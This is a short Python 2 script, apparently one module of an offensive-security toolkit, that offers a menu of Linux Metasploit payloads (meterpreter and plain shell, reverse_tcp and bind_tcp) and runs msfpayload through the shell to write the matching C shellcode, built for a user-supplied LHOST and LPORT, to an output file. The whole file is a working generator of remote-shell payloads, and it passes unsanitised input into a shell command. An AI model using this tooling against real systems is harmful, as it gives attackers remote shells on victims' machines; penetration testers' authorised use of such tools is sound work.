#!/usr/bin/python
#

import subprocess as subp
import os, sys
from src.core import menus
from src.core.main import *
from time import sleep

def createShellcode(pltype, payload, ip, port, outfile):
	subp.Popen("msfpayload %s LHOST=%s LPORT=%s C > output/%s" % (payload, ip, port, outfile), shell=True, stdout=subp.PIPE)
	
while 1:
	try:
		
		selection = 0
		while selection != range(1,4):
			clear()
			menus.linux_msf_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			
			if selection == "1":
				pltype = "r"
				payload = "linux/x86/meterpreter/reverse_tcp"
				break
			elif selection == "2":
				pltype = "b"
				payload = "linux/x86/meterpreter/bind_tcp"
				break
			elif selection == "3":
				pltype = "r"
				payload = "linux/x86/shell/reverse_tcp"
				break
			elif selection == "4":
				pltype = "b"
				payload = "linux/x86/shell/bind_tcp"
				break

		# get some user info
		ip, port = connectInfo(pltype)
		
		outfile = raw_input(" Enter filename: ")
		if not outfile:
			outfile = "linuxshellcode.txt"
		
		createShellcode(pltype, payload, ip, port, outfile)
		
		# return to main
		PrintInfo("Complete. Payload saved to output/%s" % outfile)
		EntContinue()
		break

	except KeyboardInterrupt:
		break
